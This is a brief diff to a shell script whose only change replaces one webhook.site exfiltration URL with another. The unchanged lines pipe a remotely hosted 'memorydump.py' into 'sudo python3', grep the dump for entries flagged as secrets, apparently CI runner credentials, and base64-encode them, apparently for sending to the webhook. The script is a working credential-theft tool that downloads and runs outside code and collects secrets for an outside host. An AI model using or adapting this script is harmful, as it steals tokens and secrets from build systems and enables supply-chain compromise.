@@ -1,4 +1,4 @@
-YOUR_EXFIL="	https://webhook.site/4e2333b7-1273-4c12-b276-d8176a376498"
+YOUR_EXFIL="https://webhook.site/70e7937a-e041-4002-9ba8-35d54bbf3c57"
 
 if [[ "$OSTYPE" == "linux-gnu" ]]; then
   B64_BLOB=`curl -sSf https://raw.githubusercontent.com/praneshdhunjushrestha/Secret-Leak/refs/heads/main/memorydump.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0`
